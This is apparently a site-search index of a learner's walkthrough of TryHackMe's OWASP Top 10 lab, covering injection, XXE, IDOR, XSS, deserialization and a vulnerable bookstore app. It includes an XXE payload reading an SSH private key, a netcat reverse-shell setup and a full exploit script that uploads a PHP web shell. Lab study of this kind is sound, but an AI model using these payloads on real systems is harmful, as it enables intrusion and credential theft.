{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#introduction","title":"Introduction","text":"<p>This covers the questions for TryHackMe's OWASP Top 10 Room. Only the tasks with challenges will be covered and I suggest you go through the room for a deeper understanding of the vulnerabilities covered here. You should also check out the OWASP Top Ten. </p> <p>OWASP</p> <p>The Open Web Application Security Project is a nonprofit foundation focused on understanding web technologies and exploitations and provides resources and tools designed to improve the security of software applications.</p> <p>Template</p> <p>This write up was created using the Template that I adapted from crahan's HolidayHackChallengeTemplate. While the original is holiday and CTF competition specific, the genral idea and formatting is applicable to any number of reporting scenarios. I hope to utilize this better for creating ongoing reports of CTF challenges I compete in. It's based on MkDocs and the MkDocs Material theme.</p>"},{"location":"#answers","title":"Answers","text":"<p>Severity 1 - </p> <p>Use command injection with knowledge of Linux tools to exploit the vulnerability.</p> <p>Severity 2 - </p> <p>Use borken authentication to explore logic flaws within the authentication mechanism.</p> <p>Severity 3 - </p> <p>Using sensitive data exposure exploit the exposed technology to gain admin access.</p> <p>Severity 4 - </p> <p>Explore XXE vulnerability.</p> <p>Severity 5 - </p> <p>Learn how broken access controll can be exploited.</p> <p>Severity 6 - </p> <p>View the Security Misconfiguration walkthrough here.</p> <p>Severity 7 - </p> <p>This XSS challenge showcases DOM-Based, Reflected and Stored XSS exploitation.</p> <p>Severity 8 - </p> <p>Follow allong exploiting insecure deserialization here.</p> <p>Severity 9 - </p> <p>Follow in the steps of others when working with components with known vulnerabilites.</p> <p>Severity 10 - </p> <p>Explore logs to emphsize the risk of insufficient logging and monitoring here.</p>"},{"location":"#conclusion","title":"Conclusion","text":"<p>This was an informative, free room. It's surprising to me how many vulnerabilities are the result of human error and I am looking forward to refining detection and exploitation in the pursuit of further hardening systems.</p> <p></p>"},{"location":"objectives/o1/","title":"Command Injection Practical","text":"<p>Difficulty:  Direct link: OWASP Top 10</p>"},{"location":"objectives/o1/#objective","title":"Objective","text":"<p>Command Injection</p> <p>Detect and exploit the Active Command Injection found on the target machine.</p> <p>Task 5 is the first task with questions to answer. In the previous tasks, we covered what an injection is from a cybersecurity perspective, and some of the various types, including SQL injection and command injection.</p>"},{"location":"objectives/o1/#solution","title":"Solution","text":"<p>Task 5 is specifically concerned with teaching Command Injection. After some discussion about what Active Command Injection is and how it could happen, we are presented with a list of commands to try for Linux or Windows vulnerability testing. </p> <p></p> <p>Remember that just because 1 doesn't work, doesn't mean they all are blocked</p> <p>After starting the machine and navigating to the provided IP, there is a single input field:</p> <p></p> <p>Going off the hint of commands to try, we can start with <code>whoami</code>. Entering that into our input field gives us an output of <code>www-data</code> as if we were inputting it directly to a terminal prompt.</p> <p></p> <p>Now that we have confirmed that there is a command injection vulnerability, we can began exploring for our answers. </p> <p>Task 5.1</p> <p>What strange text file is in the website root directory?</p> <p></p> <p>Enter the file found here in the room. </p> List Files <p>To list the contents of a directory we can use the list command <code>ls</code>.</p> <p>Task 5.2</p> <p>How many non-root/non-service/non-daemon users are there?</p> <p>This is a bit of a trick question. I had to look up different ways to determine if a user was a service or daemon. This site was a helpful refresher, particularly the <code>/etc/passwd</code> format.</p> oracle: x: 1021: 1020: Oracle user: /data/network/oracle: /bin/bash <code>Username</code> <code>Password</code> <code>User ID (UID)</code> <code>Group ID (GID)</code> <code>User ID Ingo (GECOS)</code> <code>Home directory</code> <code>Command/shell</code> <p></p> <p>We can look through the <code>/passwd</code> file searching for a <code>User ID (UID)</code> (column 3) over 1000 since the IDs below 1000 are typically reserved for system and service accounts. We can also look for valid login shells such as <code>/bin/bash</code> or <code>/bin/zsh</code>.</p> <p>Linux Fu</p> <p>If you are unfamiliar with basic Linux commands and file structure, it can be very useful to spend some time learning those skills. </p> Count the users who do not belong to the system <p>Use <code>cat /etc/passwd</code> to list the profiles.</p> <p>Task 5.3</p> <p>What user is this app running as?</p> <p>Since I already tested for the command injection with the <code>whoami</code> command, I can just use that response here!</p> <p></p> <p>Part of an investigation is documentation. Be sure to take notes because you never know when something you found previously by happenstance is the exact piece of the puzzle that you're missing.</p> <p>Current User</p> <p>Use the <code>whoami</code> command to list the current user's username.</p> <p>Task 5.4</p> <p>What is the user's shell set as?</p> <p>Using the format layout above and the results of the user list, we find the user from the previous question and check the last column to find what the shell is set as. </p> User's shell <p>Use <code>cat /etc/passwd | awk -F: '{print $1, $7}'</code> to list the first and last column. Then find the username and copy/paste the answer.</p> <p>Task 5.5</p> <p>What version of Ubuntu is running?</p> <p>To answer this we will need to know how to list versions of our operating system. Since the question was kind enough to give the operating system as Ubuntu, it is possible to search specifically for the Ubuntu preferred method. There are a number of ways that the version of an operating system can be found from a command line and this link list 5 different ones that can be used. </p> Version <p>I used <code>lsb_release -a</code> to list the correct version.</p> <p>Task 5.6</p> <p>Print out the MOTD.  What favorite beverage is shown?</p> <p>This question called for some research to learn what the MOTD is as well as the various ways to interact with it. First, I checked the hint, which wasn't initially helpfull.</p> Hint <p>00-header</p> <p>I start like most initial research; a Google search. Looking up what the \"motd\" is in reference to Linux brought me here to explain that \"motd\" is an abbreviation for \"Message Of The Day\". This is a message that is displayed after a successful login but just before the login shell is executed by <code>login(1)</code>. Digging further, I found various references to the <code>motd</code> file and how to view it. Turns out Ubuntu is a little different from other distros, as mentioned here. Using the file path from the answer on that link, and the hint, we can find and read the correct MOTD message.</p> Makes the world taste better <p>Use <code>ls /etc/update-motd.d/</code> to find the list of files. Use <code>cat</code> again to read the file from the hint. </p> <p></p> <p>Using the <code>list</code> tool, our hint makes more sense</p> <p></p> <p>The output of <code>cat</code> has the answer needed.</p> <p>That completes this write up. Next up will be Broken Authentication. </p>"},{"location":"objectives/o10/","title":"Insufficient Logging and Monitoring","text":"<p>Difficulty:  Direct link: TryHackMe - OWASP</p>"},{"location":"objectives/o10/#objective","title":"Objective","text":"<p>Task 30</p> <p>Inspect the logs for clues</p>"},{"location":"objectives/o10/#hints","title":"Hints","text":"Hint 1 <p>Check for common actions in a short sequence of time</p> Hint 2 <p>Trying combinations of usernames and passwords to gain access to users' accounts.</p>"},{"location":"objectives/o10/#solution","title":"Solution","text":"<p>This task attempts to emphasize the importance of logging for incident responses. After reading through the task, download the log file and read the contents with <code>cat</code>.</p> log file<pre><code>cat login-logs_1595366583422.txt \n200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login\n200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login\n200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login\n200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login\n200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login\n200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login\n401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login\n401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login\n401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login\n401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login\n</code></pre> <p>Task 30.1</p> <p>What IP address is the attacker using?</p> <p>Attacker</p> <p>A simple visual inspection can show that there is only one repeating IP address. Put that into the answer field. </p> <p>Task 30.2</p> <p>What kind of attack is being carried out?</p> <p>Type of Attack</p> <p>Look at the log file, it appears that the attacker is attempting to log in to a different profile every five minutes. Technically, this would be a 'Password Spraying Attack' but since the answer field wont accept that, we can use the more umbrella term: \"brute force\".</p>"},{"location":"objectives/o10/#wrap-up","title":"Wrap Up","text":"<p>This was the end of the TryHackMe OWASP Top 10 room. One of the biggest takeaways for me is how each of these top 10 vulnerabilities routinely found are, by and large, relatively easy to execute. Some of them are easier with a deeper knowledge of the technology involved, but none of them really required it for a basic representation of the vulnerability. No one is perfect though, and the folks writing code for real are just people, doing their best, who are going to make mistakes. </p>"},{"location":"objectives/o2/","title":"Broken Authentication","text":"<p>Difficulty:  Direct link: TryHackMe - OWASP</p>"},{"location":"objectives/o2/#objective","title":"Objective","text":"<p>Task 7 Exploit Broken Authentication</p> <p>Explore a logic flaw within the authentication mechanism.</p> <p>Scope</p> <p>Once again, I wont be reposting what can be read in the room. TryHackMe's free resources are invaluable and I highly recommend checking it out for yourself. </p> <p>This task starts out seeming to give the steps laid out pretty clearly. Start the machine and navigate to the IP address that is provided. </p> <p></p> <p>Select Register to create an account</p> Correct VM <p>Each task has a specific target machine. Be sure to terminate the machine from task 5 before trying to spin up the machine for task 7</p>"},{"location":"objectives/o2/#solution","title":"Solution","text":"<p>Following the instructions, I first attempt to register an account with the username 'darren'.</p> <p></p> <p>Remember the password you use to create the account</p> <p></p> <p>Expected error when trying to register an existing account name.</p> <p>Now we try \" darren\". There isn't a success message but we don't get the error. Lets try logging in with \" darren\" and the password we used. </p> <p></p> <p>This is one example of Broken Authentication</p> <p>Task 7.1</p> <p>What is the flag that you found in darren's account?</p> darren <p>I was unable to copy/paste direcctly from the account. I used dev tools too inspect the page and copy the flag from the \"Elements\" page. </p> <p>Task 7.2</p> <p>What is the flag that you found in arthur's account?</p> <p>We are given a second account, \"arthur\", to try the same technique on. Once again we use a space or null character before a known account name to try re-registering an existing account. </p> arthur <p>Register the account name \" arthur\", then log in with \" arthur\" and the password you created. </p> <p>This task and room covered a single Broken Authentication example. You can dig further with this OWASP Cheat Sheet. The next vulnerability on our list is Sensitive Data Exposure. Follow along.</p>"},{"location":"objectives/o3/","title":"Sensitive Data Exposure","text":"<p>Difficulty:  Direct link: TryHackMe - OWASP</p>"},{"location":"objectives/o3/#objective","title":"Objective","text":"<p>Sensitive Data Exposure (1)</p> <p>Explore the target web application for exposed sensitive data.</p> <ol> <li>I am only presenting my work to answer the questions associated with this room. I suggest going through the Tasks not covered here to fully understand the concepts being challenged. </li> </ol>"},{"location":"objectives/o3/#solution","title":"Solution","text":"<p>Start by spinning up your target machine in Task 8, grab the IP and plug it into the browser of your choice; I am using Chromium in my Kali box. </p> <p></p> <p>Task 11.1</p> <p>What is the name of the mentioned directory?</p> <p>Looking around, the first thing I do is inspect the page Elements using DevTools. Immediately we can should take note that we have an \"assets\" endpoint we might be able to target. For now, I make a note of it and continue to explore. </p> <p></p> <p>Make a note of endpoints for future enumeration</p> <p>Not much else to see for this challenge. Moving over to the login there is a comment for us.</p> <p></p> <p>Submit the mentioned directory.</p> Directory <p>Submit \"assets\" for this answer.</p> <p>Task 11.2</p> <p>Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?</p> <p>Following the breadcrumbs, navigate to the directory and we see the flat-file mentioned in the reading, which should also be the answer to our next question. </p> Interesting File <p>Submit the interresting files' name to answer the question.</p> <p></p> <p>This is our target file.</p> <p>Task 11.3</p> <p>Use the supporting material to access the sensitive data. What is the password hash of the admin user?</p> <p>With the file just sitting there, nothing is stopping us from right-click and select \"Save link as...\". Choose the directory that you are working from. </p> <p>Download</p> <p>Watch for a notification that the download was blocked. Tell your browser that the download is safe to proceed.</p> <p>Once we have it, we can use the same commands from the reading as well as some of our Linux Fu to begin exploring. Navigate to the directory that the file we found was saved in and use the <code>file</code> command to inspect it. </p> <p></p> <p><code>file</code> can be used to determine the type of file. We see the one we found is \"SQLite 3.x database\"</p> <p>Since the file is a database flat-file, we will want to explore it further with a database manager. We know the database was written using SQLite, and it is available out-of-the-box on Kali Linux, so we can use the <code>sqlite3 &lt;database.db&gt;</code> command.</p> <p></p> <p>Use <code>sqlite3</code> to manage the database found</p> <p>The first thing I do when accessing a new database is <code>.schema</code>. This allows me to view the structure of the whole database. </p> <p></p> <p>We have two tables; <code>sessions</code> &amp; <code>users</code></p> <p>We are looking for the hash of the admin user's password; it looks like the <code>users</code> table is going to have the relevant fields. To check out the whole table use <code>SHOW * FROM users;</code>.</p> <p></p> <p>Pay attention to the layout. The userID looks like a hash as well, but we need the password hash</p> <p>There are 3 accounts listed; admin, Bob, and Alice with a potentially hashed <code>userID</code> and a hashed <code>password</code>.</p> userID username password admin 4413096d9c933359b898b6202288a650 admin REDACTED 1 23023b67a32488588db1e28579ced7ec Bob ad0234829205b9033196ba818f7a872b 1 4e8423b514eef575394ff78caed3254d Alice 268b38ca7b84f44fa0a6cdc86e6301e0 0 Admin Hash <p>Copy and paste the hash from column 3.</p> <p>Task 11.4</p> <p>Crack the hash. What is the admin's plaintext password?</p> Cracked Hash <p>The read through told us how to do this, so take the password hash over to CrackStation, paste the answer from Task 11.3, complete the CAPTCHA, and crack the hash.</p> <p></p> <p>There are many resources for password cracking, but CrackStation is an ideal online resource.</p> <p>Task 11.5</p> <p>Login as the admin. What is the flag?</p> Log in <p>This is straightforward. We have a username and password to use at the login page, which shows us a \"Welcome, admin\" page.</p> <p></p> <p>Success!</p>"},{"location":"objectives/o3/#wrap-up","title":"Wrap Up","text":"<p>This exploit was a bit more involved, however it also built off some of the previous knowledge. Lets move on to the next challenge. Read the appropriate tasks and I'll meet you in the challenges for XML External Entity.</p>"},{"location":"objectives/o4/","title":"XML External Entity (XXE)","text":"<p>Difficulty:  Direct link: TryHackMe - OWASP</p>"},{"location":"objectives/o4/#objective","title":"Objective","text":"<p>This topic is labeled \"Severity 4\" and provides more information, as well as questions about the readings. Read through the pages explaining <code>xml</code> and its importance before answering the related questions. This particular write-up will be covering task 13 through 16 questions.</p>"},{"location":"objectives/o4/#solution","title":"Solution","text":""},{"location":"objectives/o4/#task-13","title":"Task 13","text":"<p>Task 13.1</p> <p>Full form of XML</p> XML Definition <p>Copying directly from the reading, I found that XML is the abbreviation for \"Extensible Markup Language\"</p> <p>Task 13.2</p> <p>Is it compulsory to have XML prolog in XML documents?</p> XML Prolog <p>Reading the Syntax section, we can see the following in regard to XML prolog: \"This line is not compulsory to use but it is considered a 'good practice' to put that line in all your XML documents.\"</p> <p>Task 13.3</p> <p>Can we validate XML documents against a schema?</p> XML Validation <p>Again, the answer can be found in the reading. Specifically, point 3 in the section Why we use XML states \"XML allows validation using DTD and Schema.\"</p> <p>Task 13.4</p> <p>How can we specify XML version and encoding in XML document?</p> XML Specification <p>Reading through the task we can clearly see the answer \"...it specifies the XML version and the encoding used in the XML document.\" Paste it into the answer blank and move on to Task 14.</p>"},{"location":"objectives/o4/#task-14","title":"Task 14","text":"<p>Task 14.1</p> <p>How do you define a new ELEMENT?</p> ELEMENT <p>To define a new element, we can see that <code>!ELEMENT</code> is used in the DTD.</p> <p>Task 14.2</p> <p>How do you define a ROOT element?</p> ROOT <p><code>!DOCTYPE</code> defines a root element.</p> <p>Task 14.3</p> <p>How do you define a new ENTITY?</p> ENTITY <p>This is a little bit of a trick question since 'ENTITY' isn't listed in this specific reading. However, we can use pattern recognition to make an educated guess about how an ENTITY might be defined based on the way other definitions have been used. </p>"},{"location":"objectives/o4/#task-16","title":"Task 16","text":"<p>Task 16.1</p> <p>Try to display your own name using any payload.</p> Payload <p>No need to reinvent the wheel here; just use the provided payload in the \"Payload area\" </p> <p>Task 16.2</p> <p>See if you can read the /etc/passwd</p> <code>/etc/passwd</code> <p>Again, the payload was provided. Use it to print the target. </p> <p>Task 16.3</p> <p>What is the name of the user in /etc/passwd</p> User name <p>The previous command gave us the <code>/passwd</code> list so we can pull the user from it.</p> <p>Task 16.4</p> <p>Where is falcon's SSH key located?</p> Location <p>This required some digging and trial and error. I kept trying to list the contents of the directory. Eventually, I managed to research standard naming convention <code>id_rsa</code>. Adding that allowed me to view the private key and verified the correct path. </p> <p>Task 16.5</p> <p>What are the first 18 characters for falcon's private key</p> RSA <p>If you haven't done so already, use the same payload as that used to view <code>/etc/passwd</code> and change the file location. payload<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'&gt;]&gt;\n&lt;root&gt;&amp;read;&lt;/root&gt;\n</code></pre></p>"},{"location":"objectives/o4/#wrap-up","title":"Wrap Up","text":"<p>The next challenge involves using broken access control.</p>"},{"location":"objectives/o5/","title":"Broken Access Control","text":"<p>Difficulty:  Direct link: TryHackMe - OWASP</p>"},{"location":"objectives/o5/#objective","title":"Objective","text":"<p>Task 18</p> <p>Read and understand how IDOR works.</p>"},{"location":"objectives/o5/#solution","title":"Solution","text":"<p>Read the documentation then spin up your target machine. Once it gives you an IP address, navigate to it and log in with the credentials provided.</p> <p></p> <p>Make a note of the end of the URL</p> <p>Task 18.3</p> <p>Look at other users notes. What is the flag?</p> <p>I banged my head against this challenge for an excessive feeling amount of time because I got locked into an assumption. The vulnerability here is the ability to change the number of the note in the url without any validation. This allows the user <code>noot</code> to access any other user's notes.</p> <p></p> <p>Changing the note number allows us to navigate to that page.</p> <p>This is where I made my mistake. Starting from \"1\", I manually changed the note to each number up to 10. Every page was blank so I tried putting it into BurpSuite to view the responses better. I started again with 1-10. Then I wrote a Python script to print 1-100 into a text file and used that as a payload for BurpSuite's Intruder feature. I still found nothing, but the search was rather quick, and the process seemed relatively easy; maybe the range was bigger to account for the ease? This time I changed my script to print 1-1,000, updated my payload in BurpSuite, and sat back to wait... By note 467 I figured I was probably wrong and headed down a rabbit trail.  I checked other write-ups but couldn't find anything to point me in the right direction. Finally, after reaching out to the THM Discord page, it was pointed out that computer counting often begins with <code>0</code>. I kicked myself for a minute, then plugged it into the URL, grabbed the flag and pasted it in the challenge.</p> Notes <p>Change <code>?note=1</code> to <code>?note=0</code> </p>"},{"location":"objectives/o5/#reflection","title":"Reflection","text":"<p>Once again, a minor detail reminds me that it is important to pay attention to details. Keep an open mind and don't make assumptions. Let's check the security misconfiguration vulnerability. Follow along</p>"},{"location":"objectives/o6/","title":"Security Misconfiguration","text":"<p>Difficulty:  Direct link: TryHackMe - OWASP</p>"},{"location":"objectives/o6/#objective","title":"Objective","text":"<p>Task 19</p> <p>Hack into the webapp, and find the flag!</p>"},{"location":"objectives/o6/#hints","title":"Hints","text":"Hint <p>Can you find the app's source code? Maybe the documentation gives you default credentials that you can try.</p>"},{"location":"objectives/o6/#solution","title":"Solution","text":"<p>Start the VM and then navigate to the provided IP address. We see a login screen for a note taking app called Pensive Notes. This challenge is specifically targetting misconfiguration security risks, so we don't strictly need to scan the IP address with nmap. I did fuzz using <code>ffuf</code> though it was ultimately just a rabbit trail. </p> <p></p> <p>Pensive Notes landing page</p> <p></p> <p>We get four potential targets to explore using <code>big.txt</code> from SecList</p> <p> </p> <p>I poked around each of these, and used DevTools to explore the \"Source\" code as the hint suggested. This is where this room is a bit different from other rooms or tasks I have completed with TryHackMe, where the resource isn't located within the material provided in the task. After digging through all of the various pages using DevTools and running into a brick wall every time, I started digging through some other write-ups until I saw a reference to GitHub. Searching for \"Pensive Notes\" with a search engine will point to a GitHub page. </p> <p></p> <p>Another reminder to not make assumptions, even with training.</p> <p>This then is the source code that the hint wanted us to find. Scrolling through the <code>README.md</code>, we can easily find the default log in information.</p> <p></p> <p>Always conduct thorough recon</p> <p>With the username and password combo, it's a simple matter of logging in to find the flag. </p> <p></p> <p>Have a flag!</p> <p>Default Credentials are a security risk!</p> <p>Default credentials are a (surprisingly common) security flaw, especially with IoT (Internet of Things) Devices. </p>"},{"location":"objectives/o6/#wrap-up","title":"Wrap Up","text":"<p>Once I figured out the specifics of this task, it was pretty straightforward. Next in the Top 10 is Cross-site Scripting</p>"},{"location":"objectives/o7/","title":"Cross-site Scripting","text":"<p>Difficulty:  Direct link: TryHackMe - OWASP</p>"},{"location":"objectives/o7/#objective","title":"Objective","text":"<p>Task 20</p> <p>The VM attached to this task showcases DOM-Based, Reflected and Stored XSS. Deploy the machine and exploit each type!</p>"},{"location":"objectives/o7/#hints","title":"Hints","text":"Question 1 Hint <p>Take a look at some HTML tags here.</p> Question 2 Hint <p>You can get the pages documents using <code>document.cookies</code> in Javascript If you right click on this page, and select \"Inspect Element\", it will open your browsers Development Tools. You can execute Javascript in the console tab.</p> Question 3 Hint <p>Now you know you can execute Javascript directly on the webpage, you can use it to change elements on the page  Try running this in your Developer Tools console <code>document.querySelector('#thm-title').textContent = 'Hey'</code></p>"},{"location":"objectives/o7/#solution","title":"Solution","text":"<p>Task 20.1</p> <p>Navigate to  in your browser and click on the \"Reflected XSS\" tab on the navbar; craft a reflected XSS payload that will cause a popup saying \"Hello\". <p>This one we are able to find the payload in the reading. First, deploy the VM for this task and when the IP address is available, paste it in the browser of your attack machine and follow the prompt to select \"Reflected XSS\". </p> <p></p> <p>XSS Playground</p> <p></p> <p>This page is where we will inject our script</p> Reflected XSS <p>Using the payload from the reading, inject the script in the search bar and hit \"Search\". Payload<pre><code>&lt;script&gt;alert(\"Hello\")&lt;/script&gt;\n</code></pre></p> <p></p> <p>The popup gives us the flag instead of our injected string</p> <p>Task 20.2</p> <p>On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.</p> Hint <p>In Javascript window.location.hostname will show your hostname, in this case your deployed machine's hostname will be its IP.</p> <p>So given the hint provided, we can craft a similar payload to the one we just sent, replacing \"Hello\" with <code>window.location.hostname</code> so it would look like this:</p> Script <p>Use this script to trigger a new flag. Payload 2<pre><code>&lt;script&gt;alert(window.location.hostname)&lt;/script&gt;\n</code></pre></p> <p></p> <p>Reflected XSS exfiltrating information</p> <p>Task 20.3</p> <p>Now navigate to  in your browser and click on the \"Stored XSS\" tab on the navbar; make an account. Then add a comment and see if you can insert some of your own HTML. <p>So the first step is navigating to the \"Stored XSS\" page and registering an account.</p> <p></p> <p>Account creation page</p> <p>I used a generic <code>test:test</code> username and password to register an account which default logged me in.</p> <p></p> <p>Logging in should take you to the \"Stored XSS\" submission page.</p> <p>It helps to be familiar with HTML at this point, however it is not strictly necessary. If you are unfamiliar with HTML, you can read up about it more here. You can also select the hint link that is on the page to see the clues listed above under Hints. </p> <p>So I tried using a simple test by using raw HTML in the comment section. </p> Script <p>I submitted this to the comment section before reading through the hints. <code>&lt;h1&gt;This is a test&lt;/h1&gt;</code>. </p> <p></p> <p>Stored XSS</p> <p>Task 20.4</p> <p>On the same page, create an alert popup box appear on the page with your document cookies.</p> <p>This task seems to match the hint for question 2 from the \"Stored XSS\" page. Using the Dev Tools and Console, we can see the result of using the <code>document.cookie</code>.</p> <p></p> <p>Now we can see the cookie</p> <p>The instruction in the room however, says to create an alert popup. This means using the same Javascript injection we used earlier, combining it with the HTML script and trying to get the alert to pop on screen with the cookie. To do this I inserted my payload into the \"Add a comment\" section and sent it. </p> <p></p> <p>We can see that the popup matches the cookie shown in the Dev Tools. </p> Script <p>Submit <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> in the comment section. <code>alert()</code> will trigger the popup while <code>document.cookie</code> grabs the session cookie. Once we select \"OK\" the flag will also popup </p> <p>Task 20.5</p> <p>Change \"XSS Playground\" to \"I am a hacker\" by adding a comment and using Javascript.</p> <p></p> <p>This needs to be changed to \"I am a hacker\"</p> <p>The hint for this one gives us the script or command we need to use. </p> <p></p> <p><code>document.querySelector('#thm-title').textContent = 'Hey'</code></p> <p>We can just plug in the phrase that is needed to trigger the flag with the script provided into the DevTools Console:</p> Provided Script<pre><code>document.querySelector('#thm-title').textContent = 'I am a hacker'\n</code></pre> <p></p> <p>The title was changed with the console</p> <p>Unfortunately, this didn't actually trigger the flag. I tried refreshing the page with no success. So I tried once again with just submitting it as a comment on the page.</p> Script <p>Submit the HTML script as a comment to the page to trigger the flag.</p> <p></p>"},{"location":"objectives/o7/#wrap-up","title":"Wrap Up","text":"<p>This is a common attack vector that I was relatively familiar with but the next issue with Incesure Deserialization was new to me.</p>"},{"location":"objectives/o8/","title":"Insecure Deserialization","text":"<p>Difficulty:  Direct link: TryHackMe - OWASP</p>"},{"location":"objectives/o8/#objective","title":"Objective","text":"<p>Task 26</p> <p>Task 21 through 25 are reading tasks with questions that can be researched via the reading or online. Task 26 walks us through a simple exploitation of an Insecure Deserialization scenario</p>"},{"location":"objectives/o8/#hints","title":"Hints","text":"Task 21 <p>When looking for who developed the Tomcat application, the answer is not the person's name. Find the orginization name instead.</p> <p>Spoilers</p> <p>Once again, I will be focusing on the challenges that demonstrate the vulnerability without covering all of the reading and build up. I highly recommend that you read and answer all of the prompts for the preceding tasks.</p>"},{"location":"objectives/o8/#solution","title":"Solution","text":"<p>The steps for exploitation of this task seem straightforward so I wont be going into much detail here. Following the steps provided, we are able to establish Remote Controll Execution (RCE). The target machine should have been started to complete Task 25. If you are coming back to this, make sure to start the machine from Task 21. If you are continuing this task directly after completing task 25 then it is important to switch the <code>userType</code> value in the DevTools as the steps describes however, if you are starting this task after a break you can safely disregard step 1 and proceed to select the URL in \"Exchange your vim\".</p> <p> </p> <p>With DevTools open to \"Application\", select the <code>vim</code> link and watch the <code>endocdedPayload</code> appear.</p> <p></p> <p>payload delivered</p> <p>Navigate to the \"Feedback Form\" as instructed. Scroll down on THM and download the <code>pickelme.py</code> to your working directory. Use <code>chmod +x pickleme.py</code> to make the script executable on your machine.</p> <p>The script needs to be edited to run properly; I used the code editor native in Kali to open the .py file and add the IP address of my attack box. Save the file and run it in your terminal. The instructions in the room refer to a GitHub repository and creating a .py file to copy the code to however this was not necessary at the time of this writing.</p> <p></p> <p>Download and execute the pickleme.py file</p> <p>On your attack box, open your terminal with split screen in whatever way you are comfortable. I like to use top/bottom layout. In my top terminal, I started <code>netcat</code> with the recommended script <code>nc -lvnp 4444</code>.</p> <p></p> <p>netcat running on my attack box</p> <p>After running <code>pickleme.py</code> copy the output and paste it into the <code>encryptedPayload</code> field of your DevTools. Refresh the page while watching the <code>netcat</code> terminal. You'll see the browser page hang and the netcat listener will give some output. This is the reverse shell that allows us remote controll access.</p> Find the flag <p>Once we have a reverse shell, we can use basic linux commands to find our flag. I used <code>find / -name \"flag.txt\" 2&gt;/dev/null</code> to find the location. I then read the file with <code>cat</code>. </p>"},{"location":"objectives/o8/#wrap-up","title":"Wrap Up","text":"<p>This vulnerability does benefit from some foundational knowledge. It also can be much more involved to exploit. The tasks associated with this vulerability did a good job of introducing it. The next challenge involves components with known vulnerabilities. Follow the tasks associated with this vulnerability here.</p>"},{"location":"objectives/o9/","title":"Components With Known Vulnerabilites","text":"<p>Difficulty:  Direct link: TryHackMe - OWASP</p>"},{"location":"objectives/o9/#objective","title":"Objective","text":"<p>Task 29</p> <p>How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)</p>"},{"location":"objectives/o9/#hints","title":"Hints","text":"Hint 1 <p>You know its a bookstore application, you should check for recent unauthenticated bookstore app rce's.</p>"},{"location":"objectives/o9/#solution","title":"Solution","text":"<p>The first thing I did was just start poking around the web app. I navigated to the admin log in and tested <code>admin:admin</code> for fun, and it logged in. Looking around, there is an option to \"Add new book\" along with a \"Edit\" and \"Delete\" link for each current book. After logging in, I did a basic Google search to find an exploit on exploit-db using the description from the landing page. The code is below and reading through it we can see that the exploit script appears to need to be uploaded from the admin page (line 28). </p> exploit script<pre><code># Exploit Title: Online Book Store 1.0 - Unauthenticated Remote Code Execution\n# Google Dork: N/A\n# Date: 2020-01-07\n# Exploit Author: Tib3rius\n# Vendor Homepage: https://projectworlds.in/free-projects/php-projects/online-book-store-project-in-php/\n# Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip\n# Version: 1.0\n# Tested on: Ubuntu 16.04\n# CVE: N/A\n\nimport argparse\nimport random\nimport requests\nimport string\nimport sys\n\nparser = argparse.ArgumentParser()\nparser.add_argument('url', action='store', help='The URL of the target.')\nargs = parser.parse_args()\n\nurl = args.url.rstrip('/')\nrandom_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))\n\npayload = '&lt;?php echo shell_exec($_GET[\\'cmd\\']); ?&gt;'\n\nfile = {'image': (random_file + '.php', payload, 'text/php')}\nprint('&gt; Attempting to upload PHP web shell...')\nr = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)\nprint('&gt; Verifying shell upload...')\nr = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)\n\nif random_file in r.text:\n    print('&gt; Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')\n    print('&gt; Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')\n    launch_shell = str(input('&gt; Do you wish to launch a shell here? (y/n): '))\n    if launch_shell.lower() == 'y':\n        while True:\n            cmd = str(input('RCE $ '))\n            if cmd == 'exit':\n                sys.exit(0)\n            r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)\n            print(r.text)\nelse:\n    if r.status_code == 200:\n        print('&gt; Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')\n    else:\n        print('&gt; Web shell failed to upload! The web server may not have write permissions.')\n</code></pre> <p>Download the exploit so that it can be uploaded to our target on the \"Add new book\" page, then navigate to the <code>/bootstrap/img</code> page. </p> <p>Trial and Error</p> <p>A lot of my learning happens during trial and error. The step above is not the method for success. I have included it here to highlight my thought process in attempting to 'hack' this target. </p> <p>None of the files listed at <code>/bootstrap/img/</code> was the shell I was expecting. If that wasn't it, perhaps the exploit just needs to be run instead of being uploaded? Going back to the terminal and directory that the exploit was downloaded too, make the .py file executable, then run it. You may need to install dependencies, which python should alert you of. If you just execute the file, you'll be advised that a url is expected as an input argument. Use the IP address that the webapp is located at. </p> <p></p> <p>Make executable, install dependencies, execute with proper inputs</p> <p>Virtual Environment</p> <p>A virtual environment is a really useful habit to form if working with code, especially when installing dependencies. The details of python virtual environments are beyond the scope of this writing, but I highly encourage you to research and implement the practice sooner rather than later. </p> <p>It worked! I got the prompt asking if I wished to launch a shell. Once the shell is established, the command <code>wc -c /etc/passwd</code> was provided in the reading; copy and paste that to the RCE shell to get the number of characters in the /etc/passwd file.</p> Known Vulnerability <p>Use research to find the correct exploit script, download the exploit, then execute it to obtain a remote 